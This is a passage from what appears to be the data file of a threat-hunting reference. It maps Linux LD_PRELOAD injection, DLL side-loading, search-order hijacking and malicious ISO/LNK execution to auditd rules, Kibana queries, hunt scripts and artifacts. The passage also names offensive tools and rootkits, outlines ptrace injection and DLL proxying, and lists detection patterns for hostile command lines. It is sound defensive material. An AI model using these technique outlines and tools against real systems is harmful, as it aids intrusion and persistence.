          { cls: "apt-mul", name: "Red Team", note: "memfd_create ELF loaders (ddexec-style) are standard modern Linux EDR-evasion tradecraft." },
        ],
        cite: "MITRE ATT&CK T1106",
      },
      {
        sub: "T1106 - Linux Shared Library Injection (LD_PRELOAD / /etc/ld.so.preload)",
        os: "linux",
        indicator: "/etc/ld.so.preload file created or modified (injects a .so into every process system-wide); LD_PRELOAD environment variable set to a path in /tmp or /dev/shm; ldconfig invocation outside of package manager context; or a .so file dropped to a non-standard path",
        sysmon: `// Auditd rules for shared library injection

// /etc/ld.so.preload — highest severity; should not exist on clean host
-w /etc/ld.so.preload -p wa -k ldso_preload_write
-w /etc/ld.so.conf -p wa -k ldso_conf_write
-w /etc/ld.so.conf.d -p wa -k ldso_conf_write

// ldconfig execution (registers a new library system-wide)
-a always,exit -F arch=b64 -S execve \\
  -F path=/sbin/ldconfig -k ldconfig_exec
-a always,exit -F arch=b64 -S execve \\
  -F path=/usr/sbin/ldconfig -k ldconfig_exec

// .so file drops in suspicious locations
// (file in /tmp / /dev/shm with .so extension)
-a always,exit -F arch=b64 -S creat,open,openat \\
  -F dir=/tmp -F perm=w -k tmp_write
  # Filter in SIEM: file name ends with .so or .so.*

// Sysmon for Linux EID 11: TargetFilename matches
//   /etc/ld.so.preload (critical)
//   */tmp/*.so  OR  */dev/shm/*.so (high)`,
        kibana: `// /etc/ld.so.preload — critical; should not exist
event.module: "file_integrity"
AND file.path: "/etc/ld.so.preload"

// ldconfig outside package manager (library registration)
event.module: "auditd"
AND tags: "ldconfig_exec"
AND NOT process.parent.name: (
  "apt" OR "apt-get" OR "dpkg" OR "rpm" OR "yum"
  OR "dnf" OR "zypper" OR "pip" OR "pip3"
)

// ld.so.conf.d new file (adds library search path)
event.module: "file_integrity"
AND file.path: /etc/ld.so.conf.d/*
AND event.type: "created"

// .so file dropped to /tmp, /dev/shm, /var/tmp
event.module: "file_integrity"
AND file.path: (*/tmp/*.so* OR */dev/shm/*.so* OR */var/tmp/*.so*)
AND event.type: "created"

// Process environment shows LD_PRELOAD to suspicious path
// (enriched from /proc/<pid>/environ)
process.env_vars: (*LD_PRELOAD=* AND (*tmp* OR *shm* OR *home* OR *var/tmp*))

// LD_PRELOAD in shell config writes (persistence)
event.module: "file_integrity"
AND file.path: (/etc/profile.d/* OR */.bashrc OR */.bash_profile)`,
        powershell: `#!/bin/bash
# T1106 - LD_PRELOAD / shared library injection hunt

echo "[*] === /etc/ld.so.preload (should NOT exist on clean host) ==="
if [ -f /etc/ld.so.preload ]; then
  echo "[CRITICAL FLAG] /etc/ld.so.preload EXISTS:"
  cat /etc/ld.so.preload
  echo "  mtime: $(stat -c '%y' /etc/ld.so.preload)"
else
  echo "[OK] /etc/ld.so.preload does not exist"
fi

echo ""
echo "[*] === /etc/ld.so.conf.d/ (library path config) ==="
ls -la /etc/ld.so.conf.d/
for f in /etc/ld.so.conf.d/*; do
  [ -f "$f" ] || continue
  echo "--- $f ---"
  cat "$f"
  echo "  package: $(dpkg -S "$f" 2>/dev/null || rpm -qf "$f" 2>/dev/null || echo NOT FROM PACKAGE)"
done

echo ""
echo "[*] === LD_PRELOAD in all running process environments ==="
for pid in $(ls /proc | grep -E '^[0-9]+$'); do
  env_line=$(tr '\\0' '\\n' < /proc/$pid/environ 2>/dev/null | grep LD_PRELOAD)
  if [ -n "$env_line" ]; then
    comm=$(cat /proc/$pid/comm 2>/dev/null)
    echo "[FLAG] PID $pid ($comm): $env_line"
  fi
done

echo ""
echo "[*] === .so files in suspicious locations ==="
find /tmp /dev/shm /var/tmp /run -name "*.so*" -type f 2>/dev/null | \\
  while read f; do
    echo "[FLAG] $f | $(file "$f" | awk -F: '{print $2}') | mtime: $(stat -c '%y' "$f")"
  done

echo ""
echo "[*] === LD_PRELOAD in shell configs ==="
grep -r "LD_PRELOAD\\|LD_LIBRARY_PATH" \\
  /etc/profile /etc/profile.d/ /etc/bash.bashrc \\
  /root/.bashrc /home/*/.bashrc 2>/dev/null | grep -v "^#"

echo ""
echo "[*] === Non-standard libraries loaded by key processes ==="
for proc in sshd apache2 httpd nginx; do
  pid=$(pgrep -x "$proc" | head -1)
  [ -z "$pid" ] && continue
  echo "--- $proc (PID $pid) non-standard .so files ---"
  lsof -p "$pid" 2>/dev/null | grep "\\.so" | \\
    grep -v "^/usr/lib\\|^/lib/x86\\|^/lib64\\|^/lib/aarch"
done`,
        registry: `LD_PRELOAD injection artifact locations:

Primary targets (highest severity):
  /etc/ld.so.preload       - system-wide preload; loads listed .so
                             into EVERY process; should never exist
                             on a clean Linux system
  LD_PRELOAD env variable  - per-shell preload; set in ~/.bashrc
                             or systemd unit files

Library path configuration:
  /etc/ld.so.conf           - library search path config (root)
  /etc/ld.so.conf.d/*.conf  - path fragments (package-managed)
  /etc/ld.so.cache          - binary cache rebuilt by ldconfig

Userland rootkits using LD_PRELOAD:
  Azazel: hides files, processes, connections via hooked readdir()
  Jynx2: OpenSSH credential harvesting via libssl hooks
  Ebury: hooks libssl; harvests SSH creds; millions of servers
  libprocesshider: hides named process from ps/top

Drop locations for malicious .so:
  /tmp/<random>.so
  /dev/shm/<name>.so
  /usr/local/lib/<spoofed-name>.so (harder to spot)

Process library inspection:
  lsof -p <pid> | grep .so    - all .so loaded by PID
  cat /proc/<pid>/maps | grep .so  - memory-mapped libraries
  strace -e openat <cmd>      - shows library load order

Package integrity:
  dpkg --verify libc6 libssl-dev  (Debian)
  rpm -V glibc openssl-libs       (RHEL)
  '5' on any library = checksum failure = critical`,
        tools: `LD_PRELOAD rootkits in the wild:

Ebury / Windigo (RU-nexus):
  Most sophisticated LD_PRELOAD rootkit documented.
  Hooks libssl to capture SSH credentials in plaintext.
  Estimated millions of OpenSSH server infections.
  Targets hosting providers; ESET research 2014-2024.
  Uses /etc/ld.so.preload for system-wide persistence.

Azazel (open source):
  github.com/chokepoint/azazel
  Hooks readdir(), tcp connection tables, process lists
  Hides attacker files, processes, and network connections

Jynx2:
  OpenSSH-targeted LD_PRELOAD credential harvester
  Hooks authentication functions to capture passwords

libprocesshider:
  Single-purpose: hides one named process from ps/top
  github.com/gianlucaborello/libprocesshider
  Used by cryptominer campaigns to hide miner process

Cryptominer dropper campaigns:
  Rocke, 8220 Gang, TeamTNT all documented using
  malicious .so via LD_PRELOAD to hide mining processes
  from ps, top, and monitoring agents

ptrace-based injection (companion technique):
  ptrace(PTRACE_ATTACH, pid)
  PTRACE_POKETEXT to inject shellcode into running process
  More complex than LD_PRELOAD but works on running processes
  Detectable via auditd ptrace syscall events`,
        ossdetect: `Sigma rules:
- file_event_lnx_ld_so_preload_modification.yml
- file_event_lnx_so_file_drop_suspicious_path.yml
- proc_creation_lnx_ldconfig_unusual_parent.yml

Elastic detection rules:
- Modification of /etc/ld.so.preload
- Shared Library Injection via LD_PRELOAD

rkhunter:
  rkhunter --check
  Tests /etc/ld.so.preload explicitly
  Checks known rootkit shared library signatures
  rkhunter.sourceforge.net

chkrootkit:
  chkrootkit
  Checks for LD_PRELOAD-based rootkit file signatures

Volatility3:
  linux.library_list  - enumerate all loaded .so per process
  Compare loaded libs against clean baseline

AIDE / Tripwire:
  /etc/ld.so.preload  p+sha256+i+n+u+g
  /etc/ld.so.conf.d   p+sha256+i+n+u+g
  Any change to either = immediate alert

Package verify:
  dpkg --verify libc6 (Debian)
  rpm -V glibc        (RHEL)
  '5' flag on library file = checksum mismatch = critical

auditd:
  ausearch -k ldso_preload_write --start today
  ausearch -k ldso_conf_write --start today`,
        notes: "/etc/ld.so.preload is the highest-severity LD_PRELOAD artifact: any library listed there is injected into every process that starts on the system, giving an attacker simultaneous hooks in sshd, sudo, cron, and every other daemon. On a clean system this file should not exist at all - its mere presence is a critical indicator warranting immediate investigation. The LD_PRELOAD environment variable variant is more targeted: it affects only processes launched from the shell where the variable is set, making it less persistent but harder to detect because it leaves no on-disk configuration artifact beyond a shell config modification. The detection counter is /proc/<pid>/environ, which preserves each running process's environment - scanning all running processes for LD_PRELOAD pointing to non-standard paths catches active exploitation. For the Ebury/Windigo family specifically: it targets the libssl shared library, hooking authentication functions to capture SSH credentials in plaintext from every SSH connection the server processes. This is not just persistence - it is a credential harvesting mechanism that affects every user authenticating through the compromised server. File integrity monitoring on /etc/ld.so.preload and package manager verification of core libraries (libc6, libssl) are the primary controls.",
        apt: [
          { cls: "apt-ru", name: "Ebury / Windigo", note: "Most sophisticated LD_PRELOAD rootkit documented; hooks libssl to harvest SSH credentials from millions of OpenSSH servers globally." },
          { cls: "apt-cn", name: "Rocke / 8220 Gang", note: "LD_PRELOAD process hiding used to conceal crypto mining from ps and monitoring agents on compromised cloud servers." },
          { cls: "apt-mul", name: "Azazel / Jynx2 users", note: "Open-source LD_PRELOAD rootkits used by financially motivated actors for credential harvesting and process hiding on Linux servers." }
        ],
        cite: "MITRE ATT&CK T1106"
      }
    ]
  },
  {
    id: "T1129",
    name: "Shared Modules",
    desc: "DLL side-loading, search-order hijacking, suspicious-path module loads",
    rows: [
      {
        sub: "T1129 - DLL Side-Loading via Trusted Executable",
        os: "win",
        indicator: "Microsoft-signed or vendor-signed binary loading an unsigned DLL from same directory - classic DLL side-loading pattern",
        sysmon: `// EID 7 (Image Load) is the primary detection event:
EventID=7
Image=<known trusted binary>
ImageLoaded=<DLL in same dir as Image, but unsigned>
Signed=false

// Common side-load target binaries to watch:
- Original Equipment Manufacturer (OEM) tools
- Older signed Microsoft binaries with known
  search-order vulnerabilities
- Vendor utilities (any signed binary copied to a
  user-writable directory becomes a side-load risk)

// Supplementary - DLL written near trusted EXE:
EventID=11 (FileCreate)
TargetFilename=*.dll
TargetFilename path matches the directory of a
  recently-executed trusted binary in a user-writable
  location (Temp, AppData, ProgramData)`,
        kibana: `// Primary: trusted binary loading unsigned DLL (EID 7)
winlog.event_id: 7
AND file.code_signature.signed: false
AND file.path: (*\\AppData\\* OR *\\Temp\\* OR *\\ProgramData\\* OR *\\Public\\*)

// Process-level filter: signed Image loading unsigned ImageLoaded
winlog.event_id: 7
AND process.code_signature.signed: true
AND file.code_signature.signed: false
AND NOT process.executable: ("C:\\\\Windows\\\\*" OR "C:\\\\Program Files\\\\*" OR "C:\\\\Program Files (x86)\\\\*")

// Supplementary: DLL file write to user-writable path (EID 11)
winlog.event_id: 11
AND file.extension: "dll"
AND file.path: (*\\AppData\\* OR *\\Temp\\* OR *\\ProgramData\\* OR *\\Public\\*)`,
        powershell: `# Hunt for unsigned DLL loads by signed processes from user paths (EID 7)
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=7
} | Where-Object {
  $_.Properties[13].Value -eq 'false' -and
  $_.Properties[4].Value -match
    '(AppData|Temp|ProgramData|Public|Downloads)'
} | Select TimeCreated,
  @{n='LoadingProcess';e={($_.Properties[4].Value -split '\\\\')[-1]}},
  @{n='LoadedDLL';e={$_.Properties[5].Value}},
  @{n='DLLSigned';e={$_.Properties[13].Value}},
  @{n='ProcessPath';e={$_.Properties[4].Value}} |
  Sort-Object TimeCreated -Descending

# Hunt for DLLs dropped near signed binaries (EID 11)
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=11
} | Where-Object {
  $_.Properties[0].Value -match '\.dll$' -and
  $_.Properties[0].Value -match
    '(AppData|Temp|ProgramData|Public|Downloads)'
} | Select TimeCreated,
  @{n='DroppedDLL';e={$_.Properties[0].Value}},
  @{n='CreatingProcess';e={$_.Properties[5].Value}}`,
        registry: `Windows DLL search order (simplified):
1. Directory of the loading executable (highest priority)
2. C:\\Windows\\System32
3. C:\\Windows\\System
4. C:\\Windows
5. Current working directory
6. Directories in PATH environment variable

KnownDLLs registry (immune to search-order hijack):
HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs
- DLLs listed here are always loaded from System32
- Adding entries protects against side-loading
- (Requires admin to modify; defensive measure)

DLL artifacts to investigate:
- File signature check:
  Get-AuthenticodeSignature <dll_path>
- Compare DLL filename against known Microsoft DLLs
- Many side-load DLLs use names like version.dll,
  msvcr100.dll, wininet.dll - common system DLL names
  that signed apps frequently import

Side-load chain artifacts:
- The trusted executable copied to user-writable path
- The malicious DLL dropped alongside it
- Both files created around the same time
  (Sysmon EID 11 timestamps for correlation)`,
        tools: `Common side-load target binaries (historical):
- gup.exe (Notepad++ updater - older versions)
- Various Cisco / VMware / Microsoft signed utilities
- Older signed Microsoft binaries with documented
  search-order vulnerabilities

Side-load DLL generation tools:
- Koppeling (Justin Bui - DLL side-load helper)
- PEzor (PE encrypter that supports side-load wrappers)
- Custom proxy DLL builders

Threat actors known for heavy side-loading:
- PlugX malware family (extensive side-load use)
- APT41 / Winnti family (side-load tradecraft signature)
- ShadowPad (side-load via signed legitimate binaries)
- Various China-nexus operators

Detection note: side-loading is one of the favored
techniques of China-nexus APT groups specifically.
A signed binary in a user-writable directory loading
an unsigned DLL from that same directory is a high-
confidence APT41/PlugX-style intrusion indicator.`,
        ossdetect: `Sigma:
- image_load_win_susp_unsigned_dll_load.yml
- image_load_win_susp_dll_load_from_temp.yml
- file_event_win_dll_in_user_dir_with_signed_exe.yml

Atomic Red Team:
- T1574.001 (DLL Search Order Hijacking - related)
- T1574.002 (DLL Side-Loading - same conceptual technique)

Hayabusa:
- DLLSideLoadingFromUserDir rules
- UnsignedDLLLoadedByTrustedExe detection category

Velociraptor:
- Windows.Detection.DLLSideloading
  (dedicated artifact for side-load hunting)
- Windows.System.DLL

LOLBAS project:
- lolbas-project.github.io/lolbas/
  (lists binaries with known side-load potential)`,
        notes: "DLL side-loading is conceptually distinct from DLL injection - in injection, the adversary runs code in an existing process via API calls. In side-loading, the adversary tricks a trusted process into loading a malicious DLL through the normal Windows DLL search order. The result is a fully-trusted-looking process running attacker code with the trusted binary's signature inheriting to the loaded DLL's behavior from a process-trust perspective. The detection pattern is path-and-signature focused: a signed executable in a user-writable directory loading an unsigned DLL from that same directory is the canonical side-load chain. False positives: some legitimate software does run from temp directories with bundled DLLs (installers, portable apps) - signature checking on both the executable and DLL helps, but signed installers may bundle their own signed DLLs that look legitimate. The strongest signal is the combination: signed EXE in user-writable path + adjacent unsigned DLL with a system-sounding name (version.dll, wininet.dll, dwmapi.dll). This pattern is heavily used by China-nexus operators - APT41, PlugX, ShadowPad all use it as standard tradecraft.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "DLL side-loading is signature tradecraft - extensively documented across multiple sector operations." },
          { cls: "apt-cn", name: "PlugX", note: "Built around DLL side-loading via signed legitimate binaries - the canonical example of this technique." },
          { cls: "apt-cn", name: "ShadowPad", note: "Side-loading via signed binaries documented across long-running espionage operations." },
          { cls: "apt-cn", name: "Winnti", note: "Side-loading techniques shared across the broader Winnti / APT41 ecosystem." },
          { cls: "apt-mul", name: "China-nexus APTs", note: "DLL side-loading is the most common single technique signature for China-nexus APT operations." }
        ],
        cite: "MITRE ATT&CK T1129, T1574.002"
      },
      {
        sub: "T1129 - DLL Search Order Hijacking",
        os: "win",
        indicator: "Unsigned DLL placed in earlier search-order location than a legitimate system DLL - exploits Windows DLL resolution order",
        sysmon: `// EID 7 (Image Load) showing unexpected DLL path:
EventID=7
Image=<any process>
ImageLoaded=<DLL with system name but non-system path>
Signed=false

// Common hijack target DLL names (system names
// frequently imported by application code):
- version.dll
- wininet.dll
- dwmapi.dll
- profapi.dll
- cryptbase.dll
- iphlpapi.dll
- secur32.dll

// Supplementary - DLL written to application directory:
EventID=11
TargetFilename matches system DLL name above
TargetFilename path = application install directory
  (not C:\\Windows\\System32)`,
        kibana: `// Suspicious DLL load: system DLL name from non-system path
winlog.event_id: 7
AND file.name: ("version.dll" OR "wininet.dll" OR "dwmapi.dll" OR "profapi.dll" OR "cryptbase.dll" OR "iphlpapi.dll" OR "secur32.dll" OR "winhttp.dll")
AND NOT file.path: ("C:\\\\Windows\\\\System32\\\\*" OR "C:\\\\Windows\\\\SysWOW64\\\\*")
AND file.code_signature.signed: false

// Supplementary: system-named DLL dropped to app directory
winlog.event_id: 11
AND file.name: ("version.dll" OR "wininet.dll" OR "dwmapi.dll" OR "profapi.dll" OR "cryptbase.dll")
AND NOT file.path: ("C:\\\\Windows\\\\System32\\\\*" OR "C:\\\\Windows\\\\SysWOW64\\\\*")`,
        powershell: `# Hunt for system-named DLLs loaded from non-system paths
$hijackTargets = @(
  'version.dll','wininet.dll','dwmapi.dll',
  'profapi.dll','cryptbase.dll','iphlpapi.dll',
  'secur32.dll','winhttp.dll','userenv.dll'
)

Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=7
} | Where-Object {
  $dllName = ($_.Properties[5].Value -split '\\\\')[-1]
  $hijackTargets -contains $dllName -and
  $_.Properties[5].Value -notmatch '(System32|SysWOW64)' -and
  $_.Properties[13].Value -eq 'false'
} | Select TimeCreated,
  @{n='LoadingProcess';e={($_.Properties[4].Value -split '\\\\')[-1]}},
  @{n='LoadedDLL';e={$_.Properties[5].Value}},
  @{n='DLLSigned';e={$_.Properties[13].Value}} |
  Sort-Object TimeCreated -Descending

# Hunt for system DLL names dropped to non-system paths (EID 11)
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=11
} | Where-Object {
  $fileName = ($_.Properties[0].Value -split '\\\\')[-1]
  $hijackTargets -contains $fileName -and
  $_.Properties[0].Value -notmatch '(System32|SysWOW64)'
} | Select TimeCreated,
  @{n='File';e={$_.Properties[0].Value}},
  @{n='CreatingProcess';e={$_.Properties[5].Value}}`,
        registry: `KnownDLLs protection (hijack-immune):
HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs
- DLLs listed here load from System32 regardless of
  search order - protection against search-order hijack
- Common defensive hardening: add commonly-hijacked
  DLL names (version.dll, dwmapi.dll, etc.) to this list

DLL Safe Search Mode:
HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\
  SafeDllSearchMode = 1 (REG_DWORD)
- Enabled by default since Windows XP SP2
- Removes current working directory from early
  in the search order

Investigation of suspected hijack:
- Find the loading process: which application
  loaded the suspicious DLL?
- Was the trusted executable also dropped to the
  same directory? (Indicates side-load chain rather
  than pure search-order hijack)
- Compare loaded DLL hash against legitimate
  System32 version - confirms hijack via mismatch

Manifest files and side-by-side assemblies:
- C:\\Windows\\WinSxS\\ - protects against some hijacks
- Application manifest can specify exact DLL versions
  reducing search-order attack surface`,
        tools: `Search order hijacking techniques:
- Phantom DLL Hijacking:
  Drop a DLL the application tries to load but
  Windows doesn't have - the application loads it
  from CWD or app dir instead
- Search Order Hijacking:
  Drop a DLL earlier in the search order than the
  legitimate one - app loads malicious version
- DLL Proxying:
  Malicious DLL exports same functions as legitimate
  one, loads the legitimate one internally, passes
  calls through after running attacker code

Generators:
- Spartacus (Wietze Beukema):
  Hunts for DLL hijack opportunities in installed apps
- PE-bear / CFF Explorer for DLL export analysis
- DLLProxy framework for proxy DLL generation

DLL hijacking research:
- "Hijack Libs" project (hijacklibs.net):
  Comprehensive database of known hijackable DLLs
- Wietze Beukema's research on DLL hijacking surface

Used by:
APT41, China-nexus operators (heavily)
PlugX / ShadowPad (signature tradecraft)
Various espionage operators favoring stealth
Some commodity malware loaders`,
        ossdetect: `Sigma:
- image_load_win_dll_hijack_system_name.yml
- image_load_win_susp_dll_name_from_non_system.yml
- file_event_win_dll_hijack_drop.yml

Atomic Red Team:
- T1574.001 (DLL Search Order Hijacking)
- T1574.002 (DLL Side-Loading - closely related)

Hayabusa:
- DLLHijackSystemName rules
- SuspiciousDLLLocationByName detection category

Velociraptor:
- Windows.Detection.DLLSideloading
- Windows.System.DLL (DLL inventory per process)

Hijack Libs project:
- hijacklibs.net - comprehensive hijackable DLL database
- Lists known target apps and the DLLs they search for

Spartacus tool:
- DLL hijack opportunity scanner
- Identifies hijackable apps in your environment`,
        notes: "DLL Search Order Hijacking is the broader category that includes DLL Side-Loading - the previous indicator (side-loading) is the specific case where the adversary brings both a trusted executable and the malicious DLL together. This indicator covers the case where the adversary drops a malicious DLL with a system name into a directory that resolves earlier in the search order than System32, causing the application to load the malicious DLL by name. The detection focuses on common hijack target DLL names (version.dll, wininet.dll, dwmapi.dll, etc.) loaded from non-system paths. False positives are lower than you might expect because the search order is well-defined and legitimate applications generally don't redistribute these system-name DLLs - if you see wininet.dll loading from C:\\ProgramData\\some-app\\, that is almost certainly malicious. Detection complement: hijacklibs.net catalogs the most commonly-hijacked DLLs by name, which is a good starting allowlist/watchlist seed. As with side-loading, this technique is heavily associated with China-nexus APT operators - PlugX, ShadowPad, and the broader APT41/Winnti ecosystem make it signature tradecraft.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "DLL search order hijacking is core tradecraft - documented across virtually every APT41 campaign." },
          { cls: "apt-cn", name: "PlugX", note: "Search order hijacking with system-named DLLs is the canonical PlugX delivery pattern." },
          { cls: "apt-cn", name: "ShadowPad", note: "Documented use of DLL hijacking via signed legitimate executables." },
          { cls: "apt-cn", name: "APT10", note: "DLL hijacking documented in operations against managed service providers." },
          { cls: "apt-mul", name: "China-nexus APTs", note: "Single most distinctive tradecraft pattern across Chinese state-sponsored intrusion campaigns." }
        ],
        cite: "MITRE ATT&CK T1129, T1574.001"
      }
    ]
  },
  {
    id: "T1204.002",
    name: "User Execution: Malicious File",
    desc: "User clicks .exe/.lnk/.iso/.one - file launched from email or download path",
    rows: [
      {
        sub: "T1204.002 - Container File Execution from Suspicious Path",
        os: "win",
        indicator: "Process spawned from inside a mounted ISO/IMG/VHD container, or from a downloaded ZIP extraction path - post-MOTW user execution",
        sysmon: `// Process executing from mounted ISO drive letter:
EventID=1
Image=[D-Z]:\\*
ParentImage=*\\explorer.exe
// (D: and higher = optical/removable/mounted drive)
// Filter further: was this drive recently created
// by an ISO mount (correlate with MountPoints2 reg key)

// Process executing from extracted ZIP path:
EventID=1
Image=*\\AppData\\Local\\Temp\\Temp*_*\\*
// Temp1_filename.zip, Temp2_filename.zip etc.
// Windows Explorer creates these when user opens
// a ZIP without explicit extraction
ParentImage=*\\explorer.exe

// Process executing from downloads:
EventID=1
Image=*\\Downloads\\*
ParentImage=*\\explorer.exe
  OR *\\chrome.exe OR *\\msedge.exe OR *\\firefox.exe`,
        kibana: `// Process spawned from mounted drive (D: or higher)
winlog.event_id: 1
AND process.executable: /[D-Z]\:\\\\.*/
AND process.parent.name: "explorer.exe"

// Process from temp ZIP extraction path
winlog.event_id: 1
AND process.executable: *\\AppData\\Local\\Temp\\Temp*_*\\*
AND process.parent.name: "explorer.exe"

// Process from Downloads folder
winlog.event_id: 1
AND process.executable: *\\Downloads\\*
AND process.parent.name: ("explorer.exe" OR "chrome.exe" OR "msedge.exe" OR "firefox.exe")`,
        powershell: `# Hunt for process execution from mounted drives (EID 1)
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[4].Value -match '^[D-Z]:\\\\' -and
  $_.Properties[20].Value -match 'explorer\.exe'
} | Select TimeCreated,
  @{n='Image';e={$_.Properties[4].Value}},
  @{n='CmdLine';e={$_.Properties[10].Value}},
  @{n='User';e={$_.Properties[12].Value}} |
  Sort-Object TimeCreated -Descending

# Hunt for process execution from ZIP extraction paths
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[4].Value -match 'AppData\\\\Local\\\\Temp\\\\Temp\d+_'
} | Select TimeCreated,
  @{n='Image';e={$_.Properties[4].Value}},
  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
  @{n='User';e={$_.Properties[12].Value}}

# Hunt for execution from Downloads folder
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[4].Value -match '\\\\Downloads\\\\'
} | Select TimeCreated,
  @{n='Image';e={$_.Properties[4].Value}},
  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
  @{n='User';e={$_.Properties[12].Value}}`,
        registry: `Mount history (ISO/IMG container mount tracking):
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\
  Explorer\\MountPoints2\\
- Records drive letters mounted via Explorer
- Entries appear when user double-clicks ISO/IMG
- Persists across sessions; useful for retroactive
  triage of when a container was opened

Zone.Identifier ADS (Mark-of-the-Web):
- Check on suspect files:
  Get-Item file.exe -Stream Zone.Identifier
- ZoneId=3 = downloaded from internet
- ReferrerUrl and HostUrl fields (Win10+) show
  where the file originated
- MOTW is NOT inherited by files extracted from
  ISO containers - this is why ISO delivery bypasses
  many MOTW-based protections

Recent files / jump lists:
- %APPDATA%\\Roaming\\Microsoft\\Windows\\Recent\\
- %APPDATA%\\Roaming\\Microsoft\\Windows\\Recent\\
    AutomaticDestinations\\*.automaticDestinations-ms
- Shows what files the user opened recently
- Useful for confirming whether a specific file
  was clicked (vs spawned by automation)

Email attachment cache:
- %APPDATA%\\Local\\Microsoft\\Windows\\
    INetCache\\Content.Outlook\\
- Files temporarily extracted by Outlook when
  user previews or opens email attachments`,
        tools: `Container delivery mechanisms (post-2022 dominant):
- ISO files (auto-mount in Win8+, no MOTW on contents)
- IMG files (same auto-mount behavior)
- VHD/VHDX files (auto-mount as virtual disk)
- 7z archives (require extraction, but no MOTW on
  extracted contents if extracted via 7-Zip GUI)
- Password-protected ZIPs (bypass email AV scan;
  user must enter password, primes engagement)

LNK files inside containers:
- LNK = Windows shortcut
- Custom icon makes it look like a document
- Target field contains the actual command/binary
- User sees a document icon, double-clicks, gets RCE

OneNote (.one) attachments:
- Embedded attachments inside OneNote sections
- User prompted to "click to view"
- File extracted to %TEMP% and executed
- Popular phishing vector 2023-2024

Common payload types in containers:
- .exe (direct binary)
- .lnk (shortcut to cmd/powershell/script)
- .vbs / .js / .hta (script files)
- .iso containing nested .lnk (post-MOTW chain)

Threat actors heavily using container delivery:
QakBot (pivoted to ISO delivery 2022)
IcedID, Bumblebee
Various initial access brokers
Most commodity phishing post-macro-block`,
        ossdetect: `Sigma:
- proc_creation_win_susp_exec_from_iso.yml
- proc_creation_win_susp_exec_from_zip.yml
- proc_creation_win_susp_exec_from_downloads.yml
- proc_creation_win_explorer_susp_child.yml

Atomic Red Team:
- T1204.002 (user execution variants)
- T1566.001 (phishing - upstream technique)

Hayabusa:
- ExecutionFromContainerMount rules
- ExecutionFromZipExtraction rules
- ExecutionFromDownloadsFolder category

Velociraptor:
- Windows.EventLogs.Sysmon
- Windows.System.MountedDevices (ISO mount history)
- Windows.Forensics.Lnk (LNK file analysis)
- Windows.Forensics.RecentFileCache`,
        notes: "User Execution: Malicious File is the technique that captures 'the user clicked the thing.' The detection is largely about path context: execution from a mounted ISO drive letter, from a temp ZIP extraction directory, or from the Downloads folder all indicate a recently-acquired file being launched by the user. The explorer.exe parent context is essential - it confirms the user manually launched the file rather than some automated process. ISO mounting is the most important post-2022 delivery vector to understand: Windows auto-mounts ISO files when double-clicked, and files inside the mounted volume don't inherit the Zone.Identifier ADS from the outer ISO file. This means the actual payload runs without the 'Mark of the Web' warning that would otherwise prompt the user. The detection should pair container mount evidence (MountPoints2 registry key) with subsequent process execution from the mounted drive letter. False positives: legitimate ISO usage (software installers, OS recovery media) exists but is rare on user endpoints. Build allowlists from baseline behavior of your environment. This indicator is the host-side complement to T1566 Phishing in the Initial Access tactic - the network reference covers the delivery; this covers the execution.",
        apt: [
          { cls: "apt-mul", name: "QakBot", note: "Pivoted to ISO container delivery after 2022 macro block - canonical example of this technique." },
          { cls: "apt-mul", name: "IcedID", note: "Heavy use of ISO container with nested LNK + payload chains." },
          { cls: "apt-mul", name: "Bumblebee", note: "ISO and ZIP-based delivery with user-click execution dominant 2022-2023." },
          { cls: "apt-mul", name: "Initial Access Brokers", note: "Container-based delivery is the standard IAB pattern post-MOTW macro block." },
          { cls: "apt-mul", name: "Phishing Operators", note: "Universal across commodity phishing operations targeting Windows endpoints." }
        ],
        cite: "MITRE ATT&CK T1204.002, T1566.001"
      },
      {
        sub: "T1204.002 - LNK File with Suspicious Target",
        os: "win",
        indicator: "User-launched LNK shortcut with target invoking cmd/powershell or pointing to a script file - common phishing primitive",
        sysmon: `// Sysmon does not directly parse LNK file content,
// but catches the execution that LNK launches:

EventID=1
ParentImage=*\\explorer.exe
CommandLine matches:
  *cmd.exe* OR *powershell.exe*
  OR *wscript.exe* OR *cscript.exe*
  OR *mshta.exe* OR *rundll32.exe*
AND CommandLine contains suspicious arguments:
  -ExecutionPolicy Bypass
  -EncodedCommand
  -WindowStyle Hidden
  vbscript: OR javascript:
  http:// OR https://
  AppData OR Temp OR ProgramData

// Supplementary - LNK file write events (EID 11):
EventID=11
TargetFilename=*.lnk
TargetFilename path matches user-writable location`,
        kibana: `// Suspicious process spawned by explorer with risk args
winlog.event_id: 1
AND process.parent.name: "explorer.exe"
AND process.name: ("cmd.exe" OR "powershell.exe" OR "wscript.exe" OR "cscript.exe" OR "mshta.exe" OR "rundll32.exe")
AND process.command_line: (*ExecutionPolicy*Bypass* OR *EncodedCommand* OR *WindowStyle*Hidden* OR *vbscript\:* OR *javascript\:* OR *http\:\/\/* OR *https\:\/\/*)

// Supplementary: LNK files created in user-writable paths
winlog.event_id: 11
AND file.extension: "lnk"
AND file.path: (*\\AppData\\* OR *\\Temp\\* OR *\\Downloads\\* OR *\\Desktop\\*)`,
        powershell: `# Hunt for suspicious interpreter execution from explorer parent
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[20].Value -match 'explorer\.exe' -and
  $_.Properties[4].Value -match
